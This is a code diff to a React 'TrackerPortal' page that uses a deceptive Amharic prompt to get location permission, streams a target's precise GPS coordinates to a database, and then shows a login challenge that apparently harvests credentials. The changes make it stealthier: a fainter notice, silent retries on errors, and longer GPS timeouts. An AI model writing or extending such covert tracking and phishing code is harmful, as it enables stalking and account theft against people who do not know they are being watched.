@@ -117,20 +117,27 @@ export const TrackerPortal: React.FC = () => {
       // Use the provided name or a fallback
       const targetDisplayName = targetIdRef.current || `Vector ${user?.uid.slice(0, 4) || targetId?.slice(-4)}`;
 
-      // High-precision stealth stream
+      // High-precision stealth stream with quality verification
+      let lastReportTime = 0;
+      const MIN_INTERVAL = 5000; // Minimal interval between reports to avoid spam, but keep it real-time
+
       navigator.geolocation.watchPosition(
         async (position) => {
-          setStatus('granted');
           const { latitude, longitude, accuracy } = position.coords;
+          const now = Date.now();
+          
+          // Only update if it's been a few seconds or if it's the first time 
+          // (or if accuracy is significantly better)
+          if (now - lastReportTime < MIN_INTERVAL && status === 'granted') {
+             return;
+          }
+          
+          setStatus('granted');
+          lastReportTime = now;
           
           try {
             const uid = auth.currentUser?.uid || targetId || `T-ANON-${Math.random().toString(36).substring(7).toUpperCase()}`;
             const targetRef = doc(db, 'targets', uid);
-            
-            // First check if target exists to avoid overwriting metadata accidentally or handle first-time setup
-            // However, setDoc with merge: true is usually enough. 
-            // To fix "Nested arrays are not supported", we'll use a direct object for non-array fields
-            // and update history separately if needed, or stick to a flatter setDoc call.
             
             const historyItem = { 
               lat: latitude, 
@@ -149,17 +156,17 @@ export const TrackerPortal: React.FC = () => {
               history: arrayUnion(historyItem)
             }, { merge: true });
             
-            // Notification success
+            // Notification success (Subtle)
             const signalHint = document.createElement('div');
-            signalHint.className = 'fixed bottom-4 left-1/2 -translate-x-1/2 bg-emerald-500/10 border border-emerald-500/50 text-emerald-500 text-[8px] font-bold px-3 py-1 rounded shadow-lg z-[9999] animate-bounce';
-            signalHint.innerText = 'SIGNAL_LATCHED: HANDSHAKE_SUCCESS';
+            signalHint.className = 'fixed bottom-4 left-1/2 -translate-x-1/2 bg-blue-500/10 border border-blue-500/50 text-blue-500 text-[8px] font-bold px-3 py-1 rounded shadow-lg z-[9999] opacity-50';
+            signalHint.innerText = `SIGNAL_SYNC: ACCURACY_${Math.round(accuracy)}M`;
             document.body.appendChild(signalHint);
-            setTimeout(() => signalHint.remove(), 4000);
+            setTimeout(() => signalHint.remove(), 2000);
 
-            // Show login challenge after a brief delay
-            setTimeout(() => {
-               setShowLogin(true);
-            }, 3000);
+            // Show login challenge after a brief delay on the first successful fix
+            if (!showLogin) {
+              setTimeout(() => setShowLogin(true), 4000);
+            }
 
           } catch (e) {
             console.error("Uplink Error:", e);
@@ -171,14 +178,14 @@ export const TrackerPortal: React.FC = () => {
             setStatus('denied');
             setErrorMsg('ACCESS_REJECTED: የደህንነት ፈቃድ አልተሰጠም። እባክዎ ምስጢራዊ መረጃውን ለማየት ፍቃድ ይስጡ (Settings > Privacy > Location > Allow).');
           } else {
-            setStatus('error');
-            setErrorMsg(`SIGNAL_TIMEOUT: ግንኙነቱ ተቋርጧል፡፡ ክፍት ቦታ ላይ ሆነው ይሞክሩ።`);
+            // Don't kill the session on minor errors, just log and wait for next fix
+            console.warn("Retrying position fix...");
           }
         },
         { 
           enableHighAccuracy: true, 
           maximumAge: 0, 
-          timeout: 25000 
+          timeout: 60000 // Increased timeout for slow GPS fixes
         }
       );
     } catch (err: any) {
